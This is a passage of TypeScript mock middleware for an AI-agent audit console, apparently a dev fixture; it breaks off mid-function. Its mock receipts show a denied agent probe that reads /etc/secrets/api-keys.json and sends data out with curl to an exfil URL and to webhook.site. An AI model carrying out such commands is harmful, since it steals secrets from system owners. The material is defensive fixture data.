// Vite dev-server middleware that mocks the gateway API surface so the SPA
// renders without a running BEAM. Activated by `VITE_DEV_MOCKS=1`. NEVER
// shipped — only loaded when the env var is set, which only the orchestrator
// sets locally for visual-polish iteration.
//
// Mock corpus is the UNION of every audit-console surface's mock data:
//   - !86 audit corpus (MOCK_RECEIPTS): tool_kind/verb/argument_body
//     receipts across all categories with rich tag enrichment
//   - !88 MCP registry: 6 entries spanning verified / community /
//     quarantined trust tiers + an `error-` prefix injection hook for
//     visual-verifying the in-dialog error banner
//
// Endpoint surface (route → source MR):
//   - GET   /v1/auth/me                              (!86 + !88, forgiving union shape)
//   - GET   /admin/login/start                       (!86, no-op 204)
//   - GET   /admin/logout                            (!86, no-op 204)
//   - GET   /v1/audit/receipts                       (!86, list + facets)
//   - GET   /v1/audit/receipts/:run_id               (!86, detail)
//   - GET   /v1/mcp/registry                         (!88, list)
//   - GET   /v1/mcp/registry/:id                     (!88, detail)
//   - PATCH /v1/mcp/registry/:id                     (!88, in-memory mutation)
//   - GET   /v1/policy/suggestions?status=...        (!92, list)
//   - GET   /v1/policy/suggestions/:id               (!92, detail — SIMULATE FIRST sandbox)
//   - POST  /v1/policy/suggestions/:id/adopt         (!92, mints draft)
//   - POST  /v1/policy/suggestions/:id/dismiss       (!92, no-op 204)
//   - POST  /v1/policy/suggestions/refresh           (!92, async 202)
//   - GET   /v1/policy/drafts/:id                    (!92, returns drafts minted by adopt)
//   - GET   /v1/chat/conversations                   (!93, list)
//   - GET   /v1/chat/conversations/:id               (!93, detail)
//   - POST  /v1/chat/messages                        (!93, SSE streaming send-message)
//   - GET   /v1/audit/timeline                       (!94, F10 — buckets + lanes)
//   - GET   /v1/audit/receipts/:run_id/related       (!94, F10 — related events)
//   - GET   /.well-known/r5e-audit.json              (!86, manifest)

import type { Connect, Plugin } from "vite";
import type { ServerResponse } from "node:http";

// !94: Adjacency-window constants are co-owned with the SPA's
// `~/lib/timeline-constants` so the stubbed
// /v1/audit/receipts/<run_id>/related response shape matches what the
// SPA derives client-side (Constitution Principle VII).
import {
  PRINCIPAL_ADJACENT_WINDOW_MS,
  SESSION_ADJACENT_WINDOW_MS,
} from "../src/lib/timeline-constants";
// matchesPrincipal lives in `~/lib/displayField` so the dev-mocks plugin
// and the SPA's filterByScope agree on what a principal chip URL means.
import { matchesPrincipal } from "../src/lib/displayField";

const TENANT_ID = "org_01KQ5T2EH9NP3AWE54AB2APWNH";
const PRINCIPAL = "operator@example.com";

// !94 — pre-canned correlation_ids and session_ids that group several
// mock receipts under shared "workstreams" so the F10 Timeline's
// RELATED EVENTS panel populates and `?correlation_id=...` deep links
// resolve to >1 lane event.
const WORKSTREAM_LEAK_PROBE = "mock-corr-investigate-leak";
const WORKSTREAM_FEATURE_BRANCH = "mock-corr-feature-branch";
const WORKSTREAM_ORCHESTRATOR = "mock-corr-orchestrator-task";

const SESSION_LLM_AGENT_PROBE = "mock-session-llm-probe";
const SESSION_THOMAS_PRIMARY = "mock-session-thomas";
const SESSION_FRAMEWORK_AGENT = "mock-session-framework";
const SESSION_MCP_VAULT_ROTOR = "mock-session-mcp-rotor";
const SESSION_ORCHESTRATOR = "mock-session-orchestrator";

function defaultSessionFor(subject: string): string {
  if (subject === "llm-agent-01") return SESSION_LLM_AGENT_PROBE;
  if (subject === "framework-agent") return SESSION_FRAMEWORK_AGENT;
  if (subject === "mcp-vault-rotor") return SESSION_MCP_VAULT_ROTOR;
  if (subject === "orchestrator-v2") return SESSION_ORCHESTRATOR;
  return SESSION_THOMAS_PRIMARY;
}

// `/v1/auth/me` response — UNION of fields !86 and !88 each expected.
// Both shapes are present so neither consumer breaks.
const MOCK_USER = {
  // !86 shape
  user_id: "user_01KQ5VCDXS5J0DASQCZ4F5G5QT",
  email: PRINCIPAL,
  display_name: "Thomas Jones",
  role: "platform_operator",
  tenant_id: TENANT_ID,
  authenticated: true,
  // !88 shape (codegen AuthMe per the fix-pass agent's note)
  principal_subject: PRINCIPAL,
  recurse_role: "platform_operator",
  session_started_at: new Date().toISOString(),
  session_expires_at: new Date(Date.now() + 60 * 60 * 1000).toISOString(),
};

const NOW = Date.parse("2026-05-01T03:00:00Z");

function mkReceipt(opts: {
  off: number;
  category: string;
  display_summary: string;
  tool_kind: string;
  verb: string;
  argument_body: string;
  scope_kind?: string;
  decision?: "allow" | "deny";
  principal?: string;
  event_kind?: string;
  /**
   * MCP server name (datadog, github, gitlab, ...). Required for tool_kind=mcp
   * rows so ToolCell renders `MCP[<server>]` rather than bare `MCP`. Per
   * the !86 GAN F006 finding: previously the dev-mocks corpus didn't
   * populate this field, so the brief-required `MCP[<server>]` label
   * path was never exercised in visual verification.
   */
  server?: string;
  /** !94: Override run_id so deep-links + tests can point at stable receipts. */
  run_id?: string;
  /** !94: Override session_id; defaults to a per-principal session. */
  session_id?: string;
  /** !94: Override correlation_id; defaults to the synthesized run_id. */
  correlation_id?: string;
}) {
  const ts = new Date(NOW - opts.off * 1000).toISOString();
  const id = opts.run_id ?? `mock-${opts.off.toString(36)}-${opts.category}`;
  const subject = opts.principal ?? PRINCIPAL;
  // !94: autonomous principals get an autonomous-shaped principal so
  // displayPrincipal renders a reasonable subject (and timeline filters
  // by principal-kind cluster correctly).
  const isAutonomous = subject !== PRINCIPAL && subject.includes("-");
  const principalShape = isAutonomous
    ? {
        kind: "autonomous" as const,
        spiffe_id: `spiffe://r5e/agents/${subject}`,
        subject,
        issuer: "observed://gateway",
        schema_version: "1.0",
      }
    : {
        kind: "obo_human" as const,
        subject,
        issuer: "observed://gateway",
        schema_version: "1.0",
      };
  return {
    run_id: id,
    signed_predicate: {
      run_id: id,
      session_id: opts.session_id ?? defaultSessionFor(subject),
      turn_id: id,
      event_kind: opts.event_kind ?? "tool_call",
      machine_identity: { spiffe_id: "observed://gateway" },
      principal: principalShape,
      tenant_id: TENANT_ID,
      policy_canonical_hash: null,
      payload_hash: null,
      payload_uri: `recurse://import/claude_code_session_jsonl/mock/${id}`,
      correlation_id: opts.correlation_id ?? id,
      signer_kms_key_id: "observed://gateway",
      signer_key_version: "v1",
      timestamp: ts,
      tool_name: opts.tool_kind === "bash" ? "Bash" : null,
      tool_summary: opts.display_summary,
    },
    outer_container: {
      verification_level: "global_inclusion_verified",
      tier_completeness_advisory: "partial",
      session_chain_epoch: 0,
      session_chain_root: null,
      policy_decision: opts.decision ?? "allow",
      outcome: opts.decision === "deny" ? "denied" : "success",
      upstream_status_code: opts.decision === "deny" ? 403 : null,
      commit_retry_exhausted: false,
      tags: {
        category: opts.category,
        display_summary: opts.display_summary,
        tool_kind: opts.tool_kind,
        verb: opts.verb,
        argument_body: opts.argument_body,
        scope_kind: opts.scope_kind ?? null,
        scope_value: opts.argument_body,
        target_resources: opts.tool_kind === "webfetch" ? [`host:${new URL(opts.argument_body).host}`] : [],
        semantic_args: {
          verb: opts.verb,
          writes: opts.verb === "rm" || opts.verb === "Edit",
          // MCP server name only set for tool_kind=mcp rows. ToolCell reads
          // this to render `MCP[<server>]` instead of bare `MCP`.
          ...(opts.server ? { server: opts.server } : {}),
        },
      },
    },
  };
}

const MOCK_RECEIPTS = [
  // !94 Workstream A — llm-agent-01 leak-probe (Timeline demo hero
  // scenario: ls /etc → ls /etc/secrets → DENY on api-keys.json + DENY
  // on curl exfil. correlation_id ties them together so RELATED EVENTS
  // populates).
  mkReceipt({ off: 350, category: "subprocess_exec", display_summary: "Bash: ls /etc", tool_kind: "bash", verb: "ls", argument_body: "/etc", scope_kind: "file_outside_workdir", principal: "llm-agent-01", correlation_id: WORKSTREAM_LEAK_PROBE }),
  mkReceipt({ off: 320, category: "subprocess_exec", display_summary: "Bash: ls /etc/secrets", tool_kind: "bash", verb: "ls", argument_body: "/etc/secrets", scope_kind: "file_outside_workdir", principal: "llm-agent-01", correlation_id: WORKSTREAM_LEAK_PROBE }),
  mkReceipt({ off: 270, category: "policy_denied", display_summary: "Read: /etc/secrets/api-keys.json", tool_kind: "read", verb: "cat", argument_body: "/etc/secrets/api-keys.json", scope_kind: "file_outside_workdir", decision: "deny", principal: "llm-agent-01", run_id: "mock-u-policy_denied", correlation_id: WORKSTREAM_LEAK_PROBE }),
  mkReceipt({ off: 90, category: "policy_denied", display_summary: "Bash: curl -s https://ext.api/exfil", tool_kind: "bash", verb: "curl", argument_body: "-s https://ext.api/exfil", decision: "deny", principal: "llm-agent-01", correlation_id: WORKSTREAM_LEAK_PROBE }),

  // !94 Workstream B — operator@example.com feature-branch work
  mkReceipt({ off: 30, category: "subprocess_exec", display_summary: "Bash: git status", tool_kind: "bash", verb: "git", argument_body: "status", scope_kind: "git_readonly", correlation_id: WORKSTREAM_FEATURE_BRANCH }),
  mkReceipt({ off: 60, category: "mcp_tool_call", display_summary: "MCP[datadog]: query_metrics — cpu_load between 2024-01-01 and 2024-12-31", tool_kind: "mcp", verb: "query_metrics", argument_body: '{"metric":"cpu_load","since":"2024-01-01","until":"2024-12-31"}', server: "datadog", correlation_id: WORKSTREAM_FEATURE_BRANCH }),
  mkReceipt({ off: 150, category: "file_write", display_summary: "Edit: lib/r5e/extractor/pipeline.ex", tool_kind: "edit", verb: "Edit", argument_body: "lib/r5e/extractor/pipeline.ex", scope_kind: "file_inside_workdir", correlation_id: WORKSTREAM_FEATURE_BRANCH }),
  mkReceipt({ off: 420, category: "file_write", display_summary: "Edit: ui/src/pages/Dashboard.tsx", tool_kind: "edit", verb: "Edit", argument_body: "ui/src/pages/Dashboard.tsx", scope_kind: "file_inside_workdir", correlation_id: WORKSTREAM_FEATURE_BRANCH }),
  mkReceipt({ off: 660, category: "subprocess_exec", display_summary: "Bash: glab mr create --title 'feat: ...'", tool_kind: "bash", verb: "glab", argument_body: "mr create --title 'feat: ...'", correlation_id: WORKSTREAM_FEATURE_BRANCH }),
  mkReceipt({ off: 900, category: "subprocess_exec", display_summary: "Bash: git commit -m 'fix: ...'", tool_kind: "bash", verb: "git", argument_body: "commit -m 'fix: ...'", correlation_id: WORKSTREAM_FEATURE_BRANCH }),

  // !94 Workstream C — orchestrator-v2 dispatching subagents
  mkReceipt({ off: 210, category: "agent_dispatch", display_summary: "Agent: dispatch to code-review-agent", tool_kind: "agent", verb: "dispatch", argument_body: "code-review-agent", principal: "orchestrator-v2", correlation_id: WORKSTREAM_ORCHESTRATOR }),
  mkReceipt({ off: 780, category: "agent_dispatch", display_summary: "Agent: dispatch to general-purpose subagent", tool_kind: "agent", verb: "dispatch", argument_body: "general-purpose", principal: "orchestrator-v2", correlation_id: WORKSTREAM_ORCHESTRATOR }),

  // Standalone activity (no shared workstream)
  mkReceipt({ off: 120, category: "llm_call", display_summary: "LLM: chat completion · gpt-4 · 847 tok", tool_kind: "llm", verb: "completion", argument_body: "gpt-4 847 tok", event_kind: "llm_call", principal: "framework-agent" }),
  mkReceipt({ off: 540, category: "llm_call", display_summary: "LLM: chat completion · gpt-4 · 1203 tok", tool_kind: "llm", verb: "completion", argument_body: "gpt-4 1203 tok", event_kind: "llm_call", principal: "framework-agent" }),
  mkReceipt({ off: 180, category: "policy_denied", display_summary: "Network: POST https://webhook.site/data", tool_kind: "webfetch", verb: "POST", argument_body: "https://webhook.site/data", decision: "deny", principal: "llm-agent-01" }),
  mkReceipt({ off: 240, category: "mcp_tool_call", display_summary: "MCP[github]: create_pull_request — r5e-enterprise!88", tool_kind: "mcp", verb: "create_pull_request", argument_body: '{"repo":"r5e-enterprise","number":88}', server: "github", principal: "mcp-vault-rotor" }),
  mkReceipt({ off: 300, category: "subprocess_exec", display_summary: "Bash: rm -rf /tmp/build", tool_kind: "bash", verb: "rm", argument_body: "-rf /tmp/build" }),
  mkReceipt({ off: 360, category: "subprocess_exec", display_summary: "Bash: ls -la /var/log", tool_kind: "bash", verb: "ls", argument_body: "-la /var/log", scope_kind: "file_outside_workdir" }),
  mkReceipt({ off: 480, category: "mcp_tool_call", display_summary: "MCP[gitlab]: list_merge_requests", tool_kind: "mcp", verb: "list_merge_requests", argument_body: '{"state":"opened"}', server: "gitlab", principal: "mcp-vault-rotor" }),
  mkReceipt({ off: 600, category: "file_search", display_summary: "Grep: 'TODO' in apps/", tool_kind: "search", verb: "grep", argument_body: "'TODO' in apps/" }),
  mkReceipt({ off: 720, category: "network_egress", display_summary: "WebFetch: https://workos.com/docs/sso", tool_kind: "webfetch", verb: "GET", argument_body: "https://workos.com/docs/sso" }),
  mkReceipt({ off: 840, category: "todo_management", display_summary: "TodoWrite: 5 items", tool_kind: "todo", verb: "todo", argument_body: "5 items" }),
];

// ---------------------------------------------------------------------------
// MCP registry corpus (!88)
// ---------------------------------------------------------------------------

interface Vulnerability {
  id: string;
  severity: "low" | "medium" | "high" | "critical" | "unknown";
  summary: string;
  source?: string;
  fixed_versions?: string[];
  url?: string;
}

interface Component {
  name: string;
  version: string;
  license?: string;
  purl?: string;
  vulnerabilities?: Vulnerability[];
}

interface RegistryEntry {
  id: string;
  name: string;
  description: string;
  source: string;
  version: string;
  transport: "http" | "stdio" | "websocket" | "sse";
  trust_tier: "verified" | "community" | "quarantined";
  publisher: string;
  capabilities: { tools: { name: string; description: string }[] };
  policy_constraints: {
    cedar_policies?: string[];
    rate_limit_per_minute?: number;
  };
  sbom: {
    format: string;
    digest: string;
    components: Component[];
  };
}

const seedRegistry: RegistryEntry[] = [
  {
    id: "r5e-audit-mcp",
    name: "Recurse Audit MCP",
    description:
      "Verified MCP for the audit plane. Lists receipts, fetches payloads, runs Cedar simulations against the deployed bundle.",
    source: "github.com/r5e-group/audit-mcp",
    version: "0.1.0",
    transport: "http",
    trust_tier: "verified",
    publisher: "r5e-group",
    capabilities: {
      tools: [
        { name: "list_receipts", description: "List recent attested receipts." },
        { name: "fetch_payload", description: "Fetch the detached payload bytes for a receipt." },
        { name: "simulate_policy", description: "Dry-run a Cedar policy against historical receipts." },
      ],
    },
    policy_constraints: {
      cedar_policies: [
        'permit(principal, action == Recurse::Action::McpToolCall, resource) when {\n  resource.mcp_server == "r5e-audit-mcp"\n};',
      ],
      rate_limit_per_minute: 60,
    },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:7b9f1f3d2c4a3a2e1b0a9f8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e",
      components: [
        { name: "elixir", version: "1.18.1", license: "Apache-2.0", vulnerabilities: [] },
        { name: "phoenix", version: "1.7.21", license: "MIT", vulnerabilities: [] },
        { name: "ecto_sql", version: "3.12.1", license: "Apache-2.0", vulnerabilities: [] },
      ],
    },
  },
  {
    id: "filesystem-mcp",
    name: "Filesystem MCP",
    description:
      "Community-tier filesystem access for read-only browsing. No write or delete capabilities.",
    source: "github.com/modelcontextprotocol/servers/tree/main/src/filesystem",
    version: "0.6.2",
    transport: "stdio",
    trust_tier: "community",
    publisher: "modelcontextprotocol",
    capabilities: {
      tools: [
        { name: "read_file", description: "Read the contents of a file." },
        { name: "list_directory", description: "List entries in a directory." },
      ],
    },
    policy_constraints: {
      cedar_policies: [],
      rate_limit_per_minute: 30,
    },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
      components: [
        { name: "@modelcontextprotocol/sdk", version: "1.4.0", license: "MIT", vulnerabilities: [] },
        { name: "fs-glob", version: "1.0.0", license: "MIT", vulnerabilities: [] },
      ],
    },
  },
  {
    id: "github-issues-mcp",
    name: "GitHub Issues MCP",
    description:
      "Community MCP for reading and commenting on GitHub issues. Subject to per-repo Cedar gating.",
    source: "github.com/example-org/github-issues-mcp",
    version: "1.2.3",
    transport: "http",
    trust_tier: "community",
    publisher: "example-org",
    capabilities: {
      tools: [
        { name: "list_issues", description: "List issues for a repository." },
        { name: "comment_on_issue", description: "Post a comment on an issue." },
      ],
    },
    policy_constraints: {
      cedar_policies: [],
      rate_limit_per_minute: 30,
    },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abcd",
      components: [
        {
          name: "octokit",
          version: "3.1.0",
          license: "MIT",
          vulnerabilities: [
            {
              id: "CVE-2024-21487",
              severity: "medium",
              summary:
                "Server-side request forgery via crafted `meta` parameter on internal redirect handlers.",
              source: "nvd",
              url: "https://nvd.nist.gov/vuln/detail/CVE-2024-21487",
            },
          ],
        },
      ],
    },
  },
  {
    id: "web-search-mcp",
    name: "Web Search MCP",
    description: "Community MCP for outbound web search via the Brave API.",
    source: "github.com/example-org/web-search-mcp",
    version: "0.9.1",
    transport: "http",
    trust_tier: "community",
    publisher: "example-org",
    capabilities: {
      tools: [{ name: "web_search", description: "Run a web search query and return top hits." }],
    },
    policy_constraints: {
      cedar_policies: [],
      rate_limit_per_minute: 20,
    },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:9f8e7d6c5b4a3210ffeeddccbbaa99887766554433221100ffeeddccbbaa9988",
      components: [
        { name: "node-fetch", version: "3.3.2", license: "MIT", vulnerabilities: [] },
      ],
    },
  },
  {
    // Fixture for exercising the error path of the quarantine PATCH —
    // entries whose id starts with `error-` always 500 in dev-mocks.
    // Visual-verification only; never appears in real registry data.
    id: "error-quarantine-mcp",
    name: "Error Path Demo MCP",
    description:
      "Visual-verification fixture: PATCH /v1/mcp/registry/error-quarantine-mcp always returns 500. Use to exercise the in-dialog error banner.",
    source: "internal/dev-mocks",
    version: "0.0.1",
    transport: "http",
    trust_tier: "community",
    publisher: "dev-mocks",
    capabilities: { tools: [{ name: "noop", description: "no-op." }] },
    policy_constraints: { cedar_policies: [], rate_limit_per_minute: 60 },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:0000000000000000000000000000000000000000000000000000000000000000",
      components: [],
    },
  },
  {
    id: "legacy-pdf-mcp",
    name: "Legacy PDF MCP",
    description:
      "Quarantined: outdated PDF rendering MCP server with a known critical CVE in the upstream pdfjs dependency. Listed for visibility; tool calls are policy-denied at the Gateway.",
    source: "github.com/example-org/legacy-pdf-mcp",
    version: "0.3.0",
    transport: "stdio",
    trust_tier: "quarantined",
    publisher: "example-org",
    capabilities: {
      tools: [{ name: "render_pdf", description: "Render a PDF page to PNG." }],
    },
    policy_constraints: {
      cedar_policies: [
        'forbid(principal, action == Recurse::Action::McpToolCall, resource) when {\n  resource.mcp_server == "legacy-pdf-mcp"\n};',
      ],
      rate_limit_per_minute: 0,
    },
    sbom: {
      format: "cyclonedx-1.5-subset",
      digest: "sha256:badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadb",
      components: [
        {
          name: "pdfjs-dist",
          version: "2.5.207",
          license: "Apache-2.0",
          vulnerabilities: [
            {
              id: "CVE-2024-4367",
              severity: "high",
              summary:
                "PDF.js arbitrary JavaScript execution via crafted PDF (font rendering pipeline). Affects pdfjs-dist <4.2.67.",
              source: "nvd",
              url: "https://nvd.nist.gov/vuln/detail/CVE-2024-4367",
              fixed_versions: [">=4.2.67"],
            },
          ],
        },
        {
          name: "@modelcontextprotocol/sdk",
          version: "0.4.1",
          license: "MIT",
          vulnerabilities: [
            {
              id: "GHSA-9999-aaaa-bbbb",
              severity: "medium",
              summary:
                "Older MCP SDK leaks request bodies into stderr at trace log level. Fixed in 1.0.0.",
              source: "ghsa",
            },
          ],
        },
      ],
    },
  },
];

// ---------------------------------------------------------------------------
// Policy suggestions corpus (!92)
// ---------------------------------------------------------------------------

interface PolicySuggestion {
  id: string;
  source: "heuristic" | "llm";
  confidence: number;
  title?: string | null;
  body?: string | null;
  pattern_summary: string;
  proposed_cedar: string;
  blast_radius_snapshot?: {
    matches_intent?: number;
    unintended?: number;
    would_have_allowed?: number;
    no_change?: number;
  } | null;
  triggered_by_receipt_ids?: string[] | null;
  triggered_by_count?: number | null;
  dismiss_reason?: string | null;
  status: "active" | "adopted_as_draft" | "dismissed";
  generated_at: string;
  inserted_at?: string;
  adopted_as_draft_id?: string | null;
}

const SUGG_NOW = new Date();
const minutesAgo = (m: number) =>
  new Date(SUGG_NOW.getTime() - m * 60_000).toISOString();

const ACTIVE_SUGGESTIONS: PolicySuggestion[] = [
  {
    id: "sug-001",
    source: "heuristic",
    confidence: 95,
    title: "Forbid bash subprocess writes outside working directory",
    body: "Auditor pattern: 17 denied bash commands writing to /etc/* or /tmp/* in the last 24h.",
    pattern_summary:
      "Forbid bash writes to system paths (heuristic match: 17 denied receipts in 24h)",
    proposed_cedar: `forbid (
  principal,
  action == Recurse::Action::"BashExec",
  resource
) when {
  resource.tags.tool_kind == "bash" &&
  resource.tags.verb in ["rm", "sudo", "chmod"] &&
  resource.tags.argument_body like "*/etc/*"
};`,
    blast_radius_snapshot: {
      matches_intent: 5,
      unintended: 12,
      would_have_allowed: 0,
      no_change: 1572,
    },
    triggered_by_receipt_ids: [
      "11111111-1111-1111-1111-111111111111",
      "22222222-2222-2222-2222-222222222222",
      "33333333-3333-3333-3333-333333333333",
      "44444444-4444-4444-4444-444444444444",
      "55555555-5555-5555-5555-555555555555",
    ],
    triggered_by_count: 17,
    status: "active",
    generated_at: minutesAgo(2),
    inserted_at: minutesAgo(2),
  },
  {
    id: "sug-002",
    source: "llm",
    confidence: 78,
    title: "Quarantine the legacy-pdf-mcp tool server",
    body: "GPT-4o flagged 4 receipts where legacy-pdf-mcp returned PDF blobs inline; suspected exfiltration vector.",
    pattern_summary: "Quarantine legacy-pdf-mcp server based on cluster of suspect receipts",
    proposed_cedar: `forbid (
  principal,
  action == Recurse::Action::"McpToolCall",
  resource
) when {
  resource.tags.semantic_args.server == "legacy-pdf-mcp"
};`,
    blast_radius_snapshot: {
      matches_intent: 4,
      unintended: 0,
      would_have_allowed: 0,
      no_change: 1620,
    },
    triggered_by_receipt_ids: [
      "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
      "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
      "cccccccc-cccc-cccc-cccc-cccccccccccc",
      "dddddddd-dddd-dddd-dddd-dddddddddddd",
    ],
    triggered_by_count: 4,
    status: "active",
    generated_at: minutesAgo(7),
    inserted_at: minutesAgo(7),
  },
  {
    id: "sug-003",
    source: "heuristic",
    confidence: 55,
    title: "Forbid datadog queries spanning over a year",
    body: "Heuristic flagged 2 datadog metrics queries with time_window_span_days > 365 in the last 7 days.",
    pattern_summary: "Forbid year-spanning datadog queries (low-confidence heuristic)",
    proposed_cedar: `forbid (
  principal,
  action == Recurse::Action::"McpToolCall",
  resource
) when {
  resource.tags.semantic_args.server == "datadog" &&
  resource.tags.semantic_args.tool == "query_metrics" &&
  resource.tags.semantic_args.time_window_span_days > 365
};`,
    blast_radius_snapshot: null,
    triggered_by_receipt_ids: [
      "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee",
      "ffffffff-ffff-ffff-ffff-ffffffffffff",
    ],
    triggered_by_count: 2,
    status: "active",
    generated_at: minutesAgo(45),
    inserted_at: minutesAgo(45),
  },
];

const ADOPTED_SUGGESTIONS: PolicySuggestion[] = [
  {
    id: "sug-100",
    source: "heuristic",
    confidence: 88,
    title: "Forbid file_write outside the workdir",
    body: "Already adopted last Friday; the resulting draft is policy-1234.",
    pattern_summary: "file_write outside workdir guard (adopted)",
    proposed_cedar: `forbid (
  principal,
  action == Recurse::Action::"FileWrite",
  resource
) when {
  resource.tags.semantic_args.outside_workdir == true
};`,
    blast_radius_snapshot: {
      matches_intent: 9,
      unintended: 1,
      would_have_allowed: 0,
      no_change: 2104,
    },
    triggered_by_receipt_ids: ["99999999-9999-9999-9999-999999999999"],
    triggered_by_count: 9,
    status: "adopted_as_draft",
    generated_at: minutesAgo(60 * 24 * 4),
    inserted_at: minutesAgo(60 * 24 * 4),
    adopted_as_draft_id: "draft-1234",
  },
];

const DISMISSED_SUGGESTIONS: PolicySuggestion[] = [
  {
    id: "sug-200",
    source: "llm",
    confidence: 62,
    title: "Forbid all WebFetch from gist.github.com",
    body: "LLM grouped 3 receipts; on review the developer rotates dotfiles via gists — false positive.",
    pattern_summary: "Forbid WebFetch from gist.github.com (dismissed: developer dotfiles)",
    proposed_cedar: `forbid (
  principal,
  action == Recurse::Action::"NetworkEgress",
  resource
) when {
  resource.tags.semantic_args.host == "gist.github.com"
};`,
    blast_radius_snapshot: null,
    triggered_by_receipt_ids: ["77777777-7777-7777-7777-777777777777"],
    triggered_by_count: 3,
    status: "dismissed",
    generated_at: minutesAgo(60 * 24 * 2),
    inserted_at: minutesAgo(60 * 24 * 2),
    dismiss_reason: "Already covered by allowlist policy ALW-006",
  },
];

/**
 * In-memory store of drafts minted by the adopt mock so the subsequent
 * `GET /v1/policy/drafts/:id` request can return a coherent payload. Keys
 * survive for the lifetime of the dev server (a Vite restart resets it).
 */
const ADOPTED_DRAFTS_BY_ID = new Map<
  string,
  { id: string; cedar_source: string }
>();

// ---------------------------------------------------------------------------
// Chat conversations corpus (!93)
// ---------------------------------------------------------------------------

interface MockChatMessage {
  id: string;
  role: "user" | "agent";
  content: string;
  tool_calls: Array<{
    tool_name: string;
    args: unknown;
    result: unknown;
    attested_run_id: string | null;
  }>;
  attested_run_id: string | null;
  sequence: number;
  created_at: string;
}

interface MockConversation {
  id: string;
  started_at: string;
  last_message_at: string;
  last_user_message_excerpt: string | null;
  deleted: boolean;
  messages: MockChatMessage[];
}

const CHAT_ONE_HOUR_AGO = new Date(Date.now() - 60 * 60 * 1000).toISOString();
const CHAT_YESTERDAY = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();

const MOCK_CONVERSATIONS: MockConversation[] = [
  {
    id: "conv-mock-1",
    started_at: CHAT_ONE_HOUR_AGO,
    last_message_at: CHAT_ONE_HOUR_AGO,
    last_user_message_excerpt: "Why was Alice's last bash_exec denied?",
    deleted: false,
    messages: [
      {
        id: "msg-1-u",
        role: "user",
        content: "Why was Alice's last bash_exec denied?",
        tool_calls: [],
        attested_run_id: null,
        sequence: 0,
        created_at: CHAT_ONE_HOUR_AGO,
      },
      {
        id: "msg-1-a",
        role: "agent",
        content:
          "Looking at the most recent denial for alice@corp's bash_exec,\n" +
          "I found a deny on `bash curl https://webhook.site/data`.\n\n" +
          "The deny was triggered by the\n" +
          '"forbid bash where verb in [curl] when host is external" rule.\n' +
          "The host (webhook.site) is in the egress block list.",
        tool_calls: [
          {
            tool_name: "query_receipts",
            args: { decision: "deny", limit: 5, principal: "alice@corp" },
            result: {
              count: 5,
              receipts: [
                { run_id: "abc12345-2222-3333-4444-555555555555" },
              ],
            },
            attested_run_id: "11111111-1111-1111-1111-111111111111",
          },
          {
            tool_name: "verify_receipt",
            args: { run_id: "abc12345-2222-3333-4444-555555555555" },
            result: {
              valid: true,
              checks_passed: 5,
              checks: [
                "signature",
                "payload_hash",
                "policy_canonical_hash",
                "local_inclusion",
                "global_inclusion",
              ],
            },
            attested_run_id: "22222222-2222-2222-2222-222222222222",
          },
        ],
        attested_run_id: "33333333-3333-3333-3333-333333333333",
        sequence: 1,
        created_at: CHAT_ONE_HOUR_AGO,
      },
    ],
  },
  {
    id: "conv-mock-2",
    started_at: CHAT_YESTERDAY,
    last_message_at: CHAT_YESTERDAY,
    last_user_message_excerpt: "Show me all denials in the last hour.",
    deleted: false,
    messages: [],
  },
];

function findConversation(id: string): MockConversation | undefined {
  return MOCK_CONVERSATIONS.find((c) => c.id === id);
}

function emitSse(res: ServerResponse, event: string, data: unknown): void {
  res.write(`event: ${event}\n`);
  res.write(`data: ${JSON.stringify(data)}\n\n`);
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function jsonResponse(res: Parameters<Connect.NextHandleFunction>[1], status: number, body: unknown): void {
  res.statusCode = status;
  res.setHeader("content-type", "application/json");
  res.end(JSON.stringify(body));
}

function readBody(req: Parameters<Connect.NextHandleFunction>[0]): Promise<string> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on("data", (c) => chunks.push(Buffer.from(c)));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", (err) => reject(err));
  });
}

// ---------------------------------------------------------------------------
// F10 Timeline backend stubs (!94) — realistic projections of the mock corpus.
// ---------------------------------------------------------------------------

function buildTimelineResponse(query: URLSearchParams): unknown {
  const principal = query.get("principal");
  const sessionId = query.get("session_id");
  const correlationId = query.get("correlation_id");
  const sinceMs = query.get("since") ? Date.parse(query.get("since") as string) : null;
  const untilMs = query.get("until") ? Date.parse(query.get("until") as string) : null;

  const filtered = MOCK_RECEIPTS.filter((r) => {
    const sp = r.signed_predicate;
    if (principal && !matchesPrincipal(sp.principal, principal)) return false;
    if (sessionId && sp.session_id !== sessionId) return false;
    if (correlationId && sp.correlation_id !== correlationId) return false;
    const ts = sp.timestamp ? Date.parse(sp.timestamp) : null;
    if (ts !== null) {
      if (sinceMs !== null && ts < sinceMs) return false;
      if (untilMs !== null && ts > untilMs) return false;
    }
    return true;
  });

  // Density: hour-bucket counts grouped by category.
  const HOUR_MS = 60 * 60 * 1000;
  const buckets = new Map<number, Record<string, number>>();
  for (const r of filtered) {
    const ts = Date.parse(r.signed_predicate.timestamp ?? "");
    if (Number.isNaN(ts)) continue;
    const slot = Math.floor(ts / HOUR_MS) * HOUR_MS;
    const cat = (r.outer_container.tags?.category as string) ?? "unknown";
    const cur = buckets.get(slot) ?? {};
    cur[cat] = (cur[cat] ?? 0) + 1;
    buckets.set(slot, cur);
  }
  const density = Array.from(buckets.entries())
    .sort((a, b) => a[0] - b[0])
    .map(([slot, counts]) => ({
      ts: new Date(slot).toISOString(),
      count_by_category: counts,
    }));

  // Lanes: group-by-principal.
  const byPrincipal = new Map<string, ReturnType<typeof mkReceipt>[]>();
  for (const r of filtered) {
